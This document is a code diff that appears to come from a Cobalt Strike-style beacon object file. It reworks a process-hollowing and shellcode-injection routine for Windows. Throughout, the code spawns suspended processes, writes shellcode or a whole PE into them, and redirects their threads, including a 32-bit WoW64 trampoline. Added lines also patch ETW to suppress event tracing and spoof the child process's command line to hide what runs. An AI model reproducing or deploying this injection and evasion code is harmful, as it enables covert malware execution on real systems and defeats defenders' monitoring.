-    MSVCRT$_snprintf(cmdLine, sizeof(cmdLine) - 1, "%s", spawntoA);
-
-    PROCESS_INFORMATION pi;
-    xmemset(&pi, 0, sizeof(pi));
-
-    if (!KERNEL32$CreateProcessA(NULL, cmdLine, NULL, NULL,
-            wantOutput ? TRUE : FALSE,
-            CREATE_SUSPENDED | CREATE_NO_WINDOW,
-            NULL, NULL, &si, &pi)) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Encrypted %lu bytes -> %s (%lu bytes on disk)",
+            payloadSize, localPath, payloadSize + 16);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Use: hollow --local-pe %s --dec -a \"args\"", localPath);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
         goto cleanup;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu suspended", pi.dwProcessId);
+    /* ---- Parse PE headers (if PE mode) ---- */
+    PE_INFO peInfo;
+    xmemset(&peInfo, 0, sizeof(peInfo));
+    BYTE hdrBuf[4096];
+    DWORD hdrPeek = (payloadSize < sizeof(hdrBuf)) ? payloadSize : sizeof(hdrBuf);
+    xmemcpy(hdrBuf, payload, hdrPeek);
 
-    if (hPipeWrite) { KERNEL32$CloseHandle(hPipeWrite); hPipeWrite = NULL; }
+    BOOL isX86 = forceX86;
+
+    if (mode == MODE_PE) {
+        if (!ParsePE(hdrBuf, hdrPeek, &peInfo)) goto cleanup;
+        isX86 = !peInfo.is64;
+    }
+
+    /* ---- Pick spawnto ---- */
+    const char *spawntoA;
+    if (spawnto && spawnto[0]) {
+        spawntoA = spawnto;
+    } else {
+        spawntoA = isX86 ? DEFAULT_SPAWNTO_X86 : DEFAULT_SPAWNTO_X64;
+    }
+
+
+    /* ---- Compute real command line length for PEB padding ---- */
+    int realCmdMinBytes = 0;
+    if (mode == MODE_PE && args && args[0]) {
+        const char *bn = spawntoA;
+        const char *s = spawntoA;
+        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
+        realCmdMinBytes = MSVCRT$strlen(bn) + 1 + MSVCRT$strlen(args);
+    }
+
+    /* ---- Create suspended process ---- */
+    SPAWN_CTX sctx;
+    if (!SpawnSuspended(spawntoA, wantOutput, realCmdMinBytes, &sctx))
+        goto cleanup;
+
+    BOOL ok = FALSE;
 
     if (mode == MODE_SHELLCODE) {
-        /* ---- SHELLCODE: alloc + write + hijack RIP ---- */
-        LPVOID pSc = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, payloadSize,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        /* ---- SHELLCODE INJECTION ---- */
+        LPVOID pSc = KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL, payloadSize + 32,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!pSc) {
             BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
-            KERNEL32$TerminateProcess(pi.hProcess, 1);
-            goto proc_cleanup;
+            SpawnCleanup(&sctx, FALSE); goto cleanup;
         }
 
-        /* Decrypt + write shellcode in chunks */
         SIZE_T bw = 0;
-        if (xkey) {
-            BYTE tmp[4096];
-            DWORD off = 0;
-            while (off < payloadSize) {
-                DWORD n = (payloadSize - off < sizeof(tmp)) ? (payloadSize - off) : sizeof(tmp);
-                xmemcpy(tmp, payload + off, n);
-                XorDecrypt(tmp, n, xkey);
-                KERNEL32$WriteProcessMemory(pi.hProcess, (BYTE*)pSc + off, tmp, n, &bw);
-                xmemset(tmp, 0, n);
-                off += n;
-            }
+
+        if (isX86) {
+            /* x86 shellcode in WoW64 process: write a 64-bit trampoline
+               that transitions to 32-bit mode via retf, then runs the SC.
+               Trampoline (10 bytes):
+                 push 0x23                ; 32-bit CS selector
+                 mov eax, <sc_addr_32>    ; shellcode address (32-bit)
+                 push rax
+                 retfq                    ; far return → 32-bit mode
+            */
+            DWORD scAddr32 = (DWORD)((ULONG_PTR)pSc + 16); /* shellcode starts after trampoline */
+            BYTE tramp[10];
+            tramp[0] = 0x6A; tramp[1] = 0x23;                         /* push 0x23 */
+            tramp[2] = 0xB8;                                           /* mov eax, imm32 */
+            *(DWORD*)(tramp + 3) = scAddr32;
+            tramp[7] = 0x50;                                           /* push rax */
+            tramp[8] = 0x48; tramp[9] = 0xCB;                         /* retfq */
+
+            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, pSc, tramp, sizeof(tramp), &bw);
+            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (BYTE*)pSc + 16, payload, payloadSize, &bw);
+
+            DWORD oldProt = 0;
+            KERNEL32$VirtualProtectEx(sctx.pi.hProcess, pSc, payloadSize + 16, PAGE_EXECUTE_READ, &oldProt);
+
+            /* Set RIP to trampoline (64-bit context — thread starts in 64-bit mode) */
+            CONTEXT ctx;
+            xmemset(&ctx, 0, sizeof(ctx));
+            ctx.ContextFlags = CONTEXT_ALL;
+            KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx);
+            ctx.Rip = (DWORD64)pSc;
+            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);
+
         } else {
-            KERNEL32$WriteProcessMemory(pi.hProcess, pSc, payload, payloadSize, &bw);
+            /* x64 shellcode — direct RIP hijack */
+            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, pSc, payload, payloadSize, &bw);
+
+            DWORD oldProt = 0;
+            KERNEL32$VirtualProtectEx(sctx.pi.hProcess, pSc, payloadSize, PAGE_EXECUTE_READ, &oldProt);
+
+            CONTEXT ctx;
+            xmemset(&ctx, 0, sizeof(ctx));
+            ctx.ContextFlags = CONTEXT_ALL;
+            KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx);
+            ctx.Rip = (DWORD64)pSc;
+            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);
+
         }
 
-        CONTEXT ctx;
-        xmemset(&ctx, 0, sizeof(ctx));
-        ctx.ContextFlags = CONTEXT_ALL;
-        KERNEL32$GetThreadContext(pi.hThread, &ctx);
-        ctx.Rip = (DWORD64)pSc;
-        KERNEL32$SetThreadContext(pi.hThread, &ctx);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode at 0x%p, RIP set", pSc);
+        PatchETW(sctx.pi.hProcess);
+        ok = TRUE;
 
     } else {
         /* ---- PE HOLLOWING ---- */
-
-        /* We need PE headers to drive the hollowing.
-           Decrypt a LOCAL COPY of just the headers, use it, then zero it. */
         DWORD hdrMax = 4096;
         BYTE *hdr = (BYTE*)KERNEL32$LocalAlloc(0x40, hdrMax);
-        if (!hdr) {
-            KERNEL32$TerminateProcess(pi.hProcess, 1);
-            goto proc_cleanup;
-        }
-        DWORD hdrCopy = (payloadSize < hdrMax) ? payloadSize : hdrMax;
-        xmemcpy(hdr, payload, hdrCopy);
-        if (xkey) XorDecrypt(hdr, hdrCopy, xkey);
+        if (!hdr) { SpawnCleanup(&sctx, FALSE); goto cleanup; }
+        xmemcpy(hdr, payload, (payloadSize < hdrMax) ? payloadSize : hdrMax);
 
-        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdr;
-        PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(hdr + pDos->e_lfanew);
-
-        /* Get thread context → PEB → original ImageBase */
-        CONTEXT ctx;
-        xmemset(&ctx, 0, sizeof(ctx));
-        ctx.ContextFlags = CONTEXT_ALL;
-        if (!KERNEL32$GetThreadContext(pi.hThread, &ctx)) {
-            BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
-            xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
-            KERNEL32$TerminateProcess(pi.hProcess, 1);
-            goto proc_cleanup;
+        PE_INFO pi2;
+        if (!ParsePE(hdr, hdrMax, &pi2)) {
+            KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
         }
 
-        ULONG_PTR pebAddr = ctx.Rdx;
-        ULONG_PTR origBase = 0;
-        SIZE_T br = 0;
-        KERNEL32$ReadProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10),
-            &origBase, sizeof(origBase), &br);
+        if (pi2.is64) {
+            /* ---- x64 PE HOLLOWING ---- */
+            CONTEXT ctx;
+            xmemset(&ctx, 0, sizeof(ctx));
+            ctx.ContextFlags = CONTEXT_ALL;
+            if (!KERNEL32$GetThreadContext(sctx.pi.hThread, &ctx)) {
+                BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] origBase=0x%p peBase=0x%p",
-            (void*)origBase, (void*)(ULONG_PTR)pNt->OptionalHeader.ImageBase);
+            ULONG_PTR pebAddr = ctx.Rdx;
+            ULONG_PTR origBase = 0;
+            SIZE_T br = 0;
+            KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(pebAddr + 0x10),
+                &origBase, sizeof(origBase), &br);
 
-        /* Unmap original image */
-        NTDLL$NtUnmapViewOfSection(pi.hProcess, (PVOID)origBase);
+            NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)origBase);
 
-        /* Allocate at origBase (loader's LDR entry points here) */
-        BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess,
-            (PVOID)origBase, pNt->OptionalHeader.SizeOfImage,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (!pRemote) {
-            pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess,
-                (PVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage,
+            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote)
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote)
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
+                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote) {
+                BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
+
+            WritePEToChild(sctx.pi.hProcess, pRemote, payload, payloadSize, hdr, &pi2);
+
+            ULONG_PTR delta = (ULONG_PTR)pRemote - pi2.imageBase;
+            if (delta != 0) {
+                int rc = ApplyRelocationsRemote(sctx.pi.hProcess, pRemote, &pi2, delta);
+                if (rc < 0) { KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup; }
+
+                PIMAGE_DOS_HEADER pD = (PIMAGE_DOS_HEADER)hdr;
+                ULONG_PTR newImgBase = (ULONG_PTR)pRemote;
+                SIZE_T bw2 = 0;
+                KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
+                    pRemote + pD->e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
+                    offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase),
+                    &newImgBase, sizeof(newImgBase), &bw2);
+            }
+
+            /* Update PEB ImageBase */
+            ULONG_PTR newBase = (ULONG_PTR)pRemote;
+            SIZE_T bw3 = 0;
+            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (PVOID)(pebAddr + 0x10),
+                &newBase, sizeof(newBase), &bw3);
+
+            KERNEL32$FlushInstructionCache(sctx.pi.hProcess, pRemote, pi2.sizeOfImage);
+
+            ctx.Rcx = (DWORD64)((ULONG_PTR)pRemote + pi2.entryPointRva);
+            KERNEL32$SetThreadContext(sctx.pi.hThread, &ctx);
+
+        } else {
+            /* ---- x86 PE HOLLOWING (WoW64) ---- */
+
+            /* Get PEB32 address via ProcessWow64Information */
+            ULONG_PTR peb32Addr = 0;
+            NTDLL$NtQueryInformationProcess(sctx.pi.hProcess, ProcessWow64Information,
+                &peb32Addr, sizeof(peb32Addr), NULL);
+            if (peb32Addr == 0) {
+                BeaconPrintf(CALLBACK_ERROR, "Not a WoW64 process — spawnto must be 32-bit for x86 PE");
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
+
+            /* Read original 32-bit ImageBase from PEB32 + 0x08 */
+            DWORD origBase32 = 0;
+            SIZE_T br = 0;
+            KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(peb32Addr + 0x08),
+                &origBase32, sizeof(origBase32), &br);
+
+            /* Unmap original 32-bit image */
+            NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)(ULONG_PTR)origBase32);
+
+            /* Allocate at origBase32 (32-bit address space, < 4GB) */
+            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote)
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    (PVOID)pi2.imageBase, pi2.sizeOfImage,
+                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote)
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
+                    pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (!pRemote) {
+                BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
+
+            WritePEToChild(sctx.pi.hProcess, pRemote, payload, payloadSize, hdr, &pi2);
+
+            /* Relocate */
+            ULONG_PTR delta = (ULONG_PTR)pRemote - pi2.imageBase;
+            if (delta != 0) {
+                int rc = ApplyRelocationsRemote(sctx.pi.hProcess, pRemote, &pi2, delta);
+                if (rc < 0) { KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup; }
+
+                PIMAGE_DOS_HEADER pD = (PIMAGE_DOS_HEADER)hdr;
+                DWORD newImgBase32 = (DWORD)(ULONG_PTR)pRemote;
+                SIZE_T bw2 = 0;
+                KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
+                    pRemote + pD->e_lfanew + offsetof(IMAGE_NT_HEADERS32, OptionalHeader) +
+                    offsetof(IMAGE_OPTIONAL_HEADER32, ImageBase),
+                    &newImgBase32, sizeof(newImgBase32), &bw2);
+            }
+
+            /* Update PEB32 ImageBase */
+            DWORD newBase32 = (DWORD)(ULONG_PTR)pRemote;
+            SIZE_T bw3 = 0;
+            KERNEL32$WriteProcessMemory(sctx.pi.hProcess, (PVOID)(peb32Addr + 0x08),
+                &newBase32, sizeof(newBase32), &bw3);
+
+            KERNEL32$FlushInstructionCache(sctx.pi.hProcess, pRemote, pi2.sizeOfImage);
+
+            /* Set WOW64 context: Eax = entry point */
+            BYTE wow64ctx[WOW64_CTX_SIZE];
+            xmemset(wow64ctx, 0, sizeof(wow64ctx));
+            *(DWORD*)(wow64ctx + WOW64_CTX_OFF_FLAGS) = WOW64_CTX_ALL;
+            if (!KERNEL32$Wow64GetThreadContext(sctx.pi.hThread, wow64ctx)) {
+                BeaconPrintf(CALLBACK_ERROR, "Wow64GetThreadContext: %lu", KERNEL32$GetLastError());
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
+
+            DWORD entry32 = (DWORD)((ULONG_PTR)pRemote + pi2.entryPointRva);
+            *(DWORD*)(wow64ctx + WOW64_CTX_OFF_EAX) = entry32;
+
+            if (!KERNEL32$Wow64SetThreadContext(sctx.pi.hThread, wow64ctx)) {
+                BeaconPrintf(CALLBACK_ERROR, "Wow64SetThreadContext: %lu", KERNEL32$GetLastError());
+                KERNEL32$LocalFree(hdr); SpawnCleanup(&sctx, FALSE); goto cleanup;
+            }
+
         }
-        if (!pRemote) {
-            pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess, NULL,
-                pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE);
-        }
-        if (!pRemote) {
-            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
-            xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
-            KERNEL32$TerminateProcess(pi.hProcess, 1);
-            goto proc_cleanup;
-        }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Alloc 0x%p (0x%lx bytes)",
-            pRemote, pNt->OptionalHeader.SizeOfImage);
 
-        /* Write PE to child (decrypting in chunks, plaintext never in beacon) */
-        WritePEToChild(pi.hProcess, pRemote, payload, payloadSize, pNt, xkey);
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] PE written to child");
+        /* ETW + command line spoof (both architectures) */
+        PatchETW(sctx.pi.hProcess);
 
-        /* Relocate if needed */
-        ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
-        if (delta != 0) {
-            IMAGE_DATA_DIRECTORY relDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-            if (relDir.Size > 0 && relDir.VirtualAddress > 0) {
-                /* Read the .reloc section from child, apply, write back */
-                BYTE *relocData = (BYTE*)KERNEL32$LocalAlloc(0x40, relDir.Size);
-                if (relocData) {
-                    SIZE_T rr = 0;
-                    KERNEL32$ReadProcessMemory(pi.hProcess,
-                        pRemote + relDir.VirtualAddress, relocData, relDir.Size, &rr);
+        {
+            const char *bn = spawntoA;
+            const char *s = spawntoA;
+            while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
+            char realCmd[4096];
+            xmemset(realCmd, 0, sizeof(realCmd));
+            if (args && args[0])
+                MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, args);
+            else
+                MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s", bn);
 
-                    /* Apply relocations by reading/patching/writing pages in child */
-                    BYTE *pBlock = relocData;
-                    DWORD processed = 0;
-                    int count = 0;
-                    while (processed < relDir.Size) {
-                        DWORD pageRva   = *(DWORD*)(pBlock);
-                        DWORD blockSize = *(DWORD*)(pBlock + 4);
-                        if (blockSize == 0 || blockSize < 8) break;
-                        DWORD entries = (blockSize - 8) / 2;
-                        WORD *entry = (WORD*)(pBlock + 8);
-
-                        /* Read the page from child */
-                        BYTE pageBuf[4096];
-                        DWORD pageSize = 4096;
-                        if (pageRva + pageSize > pNt->OptionalHeader.SizeOfImage)
-                            pageSize = pNt->OptionalHeader.SizeOfImage - pageRva;
-                        SIZE_T pbr = 0;
-                        KERNEL32$ReadProcessMemory(pi.hProcess, pRemote + pageRva,
-                            pageBuf, pageSize, &pbr);
-
-                        BOOL modified = FALSE;
-                        for (DWORD j = 0; j < entries; j++) {
-                            BYTE type = (BYTE)(entry[j] >> 12);
-                            WORD off  = entry[j] & 0xFFF;
-                            if (type == 10 && off + 8 <= pageSize) {
-                                ULONG_PTR *p = (ULONG_PTR*)(pageBuf + off);
-                                *p += delta;
-                                count++;
-                                modified = TRUE;
-                            } else if (type == 3 && off + 4 <= pageSize) {
-                                DWORD *p = (DWORD*)(pageBuf + off);
-                                *p += (DWORD)delta;
-                                count++;
-                                modified = TRUE;
+            if (pi2.is64) {
+                /* x64: spoof 64-bit PEB CommandLine */
+                SpoofCommandLine(sctx.pi.hProcess, realCmd);
+            } else {
+                /* x86: spoof 32-bit PEB CommandLine.
+                   32-bit PE reads from PEB32→ProcessParameters→CommandLine.
+                   PEB32+0x10 = ProcessParameters (DWORD ptr)
+                   ProcessParameters+0x40 = CommandLine.Length (USHORT)
+                   ProcessParameters+0x44 = CommandLine.Buffer (DWORD ptr) */
+                ULONG_PTR peb32 = 0;
+                NTDLL$NtQueryInformationProcess(sctx.pi.hProcess, ProcessWow64Information,
+                    &peb32, sizeof(peb32), NULL);
+                if (peb32) {
+                    DWORD procParams32 = 0;
+                    SIZE_T br2 = 0;
+                    KERNEL32$ReadProcessMemory(sctx.pi.hProcess, (PVOID)(peb32 + 0x10),
+                        &procParams32, sizeof(procParams32), &br2);
+                    if (procParams32) {
+                        DWORD cmdBuf32 = 0;
+                        KERNEL32$ReadProcessMemory(sctx.pi.hProcess,
+                            (PVOID)(ULONG_PTR)(procParams32 + 0x44),
+                            &cmdBuf32, sizeof(cmdBuf32), &br2);
+                        if (cmdBuf32) {
+                            int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, NULL, 0);
+                            if (wLen > 0) {
+                                LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
+                                if (wBuf) {
+                                    KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, wBuf, wLen);
+                                    SIZE_T bw = 0;
+                                    KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
+                                        (PVOID)(ULONG_PTR)cmdBuf32, wBuf,
+                                        wLen * sizeof(WCHAR), &bw);
+                                    USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
+                                    KERNEL32$WriteProcessMemory(sctx.pi.hProcess,
+                                        (PVOID)(ULONG_PTR)(procParams32 + 0x40),
+                                        &newLen, sizeof(USHORT), &bw);
+                                    KERNEL32$LocalFree(wBuf);
+                                }
                             }
                         }
-
-                        if (modified) {
-                            SIZE_T bw = 0;
-                            KERNEL32$WriteProcessMemory(pi.hProcess, pRemote + pageRva,
-                                pageBuf, pageSize, &bw);
-                        }
-
-                        pBlock += blockSize;
-                        processed += blockSize;
                     }
-                    KERNEL32$LocalFree(relocData);
-
-                    /* Update ImageBase in child's PE header */
-                    ULONG_PTR newImgBase = (ULONG_PTR)pRemote;
-                    SIZE_T bw2 = 0;
-                    DWORD imgBaseOff = pDos->e_lfanew +
-                        offsetof(IMAGE_NT_HEADERS, OptionalHeader) +
-                        offsetof(IMAGE_OPTIONAL_HEADER, ImageBase);
-                    KERNEL32$WriteProcessMemory(pi.hProcess, pRemote + imgBaseOff,
-                        &newImgBase, sizeof(newImgBase), &bw2);
-
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d relocations (delta=0x%llx)",
-                        count, (unsigned long long)delta);
                 }
-            } else {
-                BeaconPrintf(CALLBACK_ERROR, "Relocs needed but PE has none");
-                xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
-                KERNEL32$TerminateProcess(pi.hProcess, 1);
-                goto proc_cleanup;
+                /* Also spoof 64-bit PEB for tools that check both */
+                SpoofCommandLine(sctx.pi.hProcess, realCmd);
             }
-        } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] No relocs needed");
         }
 
-        /* Update PEB ImageBase */
-        ULONG_PTR newBase = (ULONG_PTR)pRemote;
-        SIZE_T bw3 = 0;
-        KERNEL32$WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10),
-            &newBase, sizeof(newBase), &bw3);
-
-        /* Set entry point */
-        ctx.Rcx = (DWORD64)((ULONG_PTR)pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
-        KERNEL32$SetThreadContext(pi.hThread, &ctx);
-
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Entry RCX=0x%p", (void*)(ULONG_PTR)ctx.Rcx);
-
-        /* Zero and free header copy */
-        xmemset(hdr, 0, hdrMax);
         KERNEL32$LocalFree(hdr);
+        ok = TRUE;
     }
 
-    /* ---- Spoof command line in PEB so the PE sees its real args ---- */
-    if (mode == MODE_PE && args && args[0]) {
-        PROCESS_BASIC_INFORMATION pbi;
-        xmemset(&pbi, 0, sizeof(pbi));
-        if (NTDLL$NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL) == 0) {
-            PEB peb;
-            SIZE_T pbr = 0;
-            if (KERNEL32$ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &pbr)) {
-                RTL_USER_PROCESS_PARAMETERS params;
-                if (KERNEL32$ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &params, sizeof(params), &pbr)) {
-                    /* Build: "basename args" */
-                    const char *bn = spawntoA;
-                    const char *s = spawntoA;
-                    while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
-
-                    char realCmd[4096];
-                    xmemset(realCmd, 0, sizeof(realCmd));
-                    MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, args);
-
-                    int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, NULL, 0);
-                    if (wLen > 0) {
-                        LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
-                        if (wBuf) {
-                            KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, wBuf, wLen);
-                            SIZE_T bw = 0;
-                            KERNEL32$WriteProcessMemory(pi.hProcess,
-                                params.CommandLine.Buffer, wBuf,
-                                wLen * sizeof(WCHAR), &bw);
-                            USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
-                            KERNEL32$WriteProcessMemory(pi.hProcess,
-                                (PBYTE)peb.ProcessParameters +
-                                    offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
-                                &newLen, sizeof(USHORT), &bw);
-                            KERNEL32$LocalFree(wBuf);
-                            BeaconPrintf(CALLBACK_OUTPUT, "[+] CmdLine: %s", realCmd);
-                        }
-                    }
-                }
-            }
-        }
-    }
+    if (!ok) { SpawnCleanup(&sctx, FALSE); goto cleanup; }
 
     /* ---- Resume ---- */
-    KERNEL32$ResumeThread(pi.hThread);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Resumed");
+    KERNEL32$ResumeThread(sctx.pi.hThread);
+    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); sctx.hPipeInWrite = NULL; }
 
-    if (wantOutput && hPipeRead) {
-        CollectOutput(pi.hProcess, hPipeRead, (DWORD)timeoutMs);
-    } else {
+    if (wantOutput && sctx.hPipeOutRead)
+        CollectOutput(sctx.pi.hProcess, sctx.hPipeOutRead, (DWORD)timeoutMs);
+    else if (!wantOutput)
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Fire and forget");
-    }
 
-proc_cleanup:
-    if (hPipeRead)    KERNEL32$CloseHandle(hPipeRead);
-    if (pi.hProcess)  KERNEL32$CloseHandle(pi.hProcess);
-    if (pi.hThread)   KERNEL32$CloseHandle(pi.hThread);
+    if (sctx.hPipeOutRead) KERNEL32$CloseHandle(sctx.hPipeOutRead);
+    if (sctx.hPipeInWrite) KERNEL32$CloseHandle(sctx.hPipeInWrite);
+    if (sctx.pi.hProcess)  KERNEL32$CloseHandle(sctx.pi.hProcess);
+    if (sctx.pi.hThread)   KERNEL32$CloseHandle(sctx.pi.hThread);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
 
 cleanup:
-    if (freePayload && payload) KERNEL32$LocalFree(payload);
+    xmemset(hdrBuf, 0, sizeof(hdrBuf));
+    if (freePayload && payloadAllocBase) KERNEL32$LocalFree(payloadAllocBase);
 }
